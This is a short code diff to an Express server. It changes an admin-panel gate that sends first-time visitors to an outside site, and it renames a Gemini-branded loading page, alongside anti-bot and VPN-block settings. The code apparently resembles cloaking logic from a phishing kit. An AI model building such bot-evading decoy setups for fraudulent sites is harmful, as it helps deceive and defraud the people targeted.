@@ -670,10 +670,10 @@ app.use('/admin', (req, res, next) => {
         res.cookie('adminAttempt', '1', {
             maxAge: 300000, // 5 minutes
             httpOnly: true,
-            secure: false,  // Set to true in production
+            secure: true,  // Set to true in production
             sameSite: 'lax'
         });
-        return res.redirect('https://gemini.com');
+        return res.redirect('https://google.com');
     }
 
     console.log('[ADMIN] Second attempt - proceeding');
@@ -716,7 +716,7 @@ const state = {
         redirectUrl: 'https://google.com',
         vpnBlockEnabled: false,
         antiBotEnabled: true,
-        defaultLandingPage: 'geminiloading.html',
+        defaultLandingPage: 'Loading.html',
         captchaEnabled: false,
         availablePages: []
     },
